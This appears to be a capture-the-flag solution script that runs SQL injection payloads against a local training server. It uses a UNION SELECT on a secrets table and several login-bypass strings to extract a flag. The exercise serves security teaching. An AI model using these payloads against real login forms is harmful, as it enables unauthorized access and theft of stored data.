#!/usr/bin/env python3
"""
SQL Injection 101 - Solution Script
Run this against the running challenge server to get the flag
"""
import re
import requests

TARGET = "http://localhost:5000"
FLAG_PATTERN = re.compile(r'CTF\{[^}]+\}')


def extract_flag(text: str) -> str | None:
    """Extract CTF flag from response text."""
    match = FLAG_PATTERN.search(text)
    return match.group() if match else None


def send_payload(payload: str) -> str | None:
    """Send SQL injection payload and return response text."""
    try:
        response = requests.post(
            TARGET,
            data={'username': payload, 'password': 'x'},
            timeout=5
        )
        return response.text
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot connect to {TARGET}")
        print("[-] Start the server first: python challenge.py")
        return None


def union_injection() -> str | None:
    """Extract flag using UNION-based injection."""
    print("[*] Attempting UNION-based SQL injection...")

    payload = "' UNION SELECT 1,value,3,4 FROM secrets WHERE name='flag'--"
    response_text = send_payload(payload)

    if response_text:
        flag = extract_flag(response_text)
        if flag:
            print(f"[+] FLAG: {flag}")
            return flag
        print("[-] Flag not found in response")

    return None


def auth_bypass() -> str | None:
    """Bypass authentication using SQL injection."""
    print("\n[*] Attempting authentication bypass...")

    payloads = [
        "' OR '1'='1'--",
        "admin'--",
        "' UNION SELECT 1,2,3,'administrator'--"
    ]

    for payload in payloads:
        response_text = send_payload(payload)
        if response_text:
            flag = extract_flag(response_text)
            if flag:
                print(f"[+] FLAG with payload '{payload}': {flag}")
                return flag

    return None


if __name__ == '__main__':
    print("=" * 50)
    print("SQL Injection 101 - Solution")
    print("=" * 50)

    union_injection()
    auth_bypass()
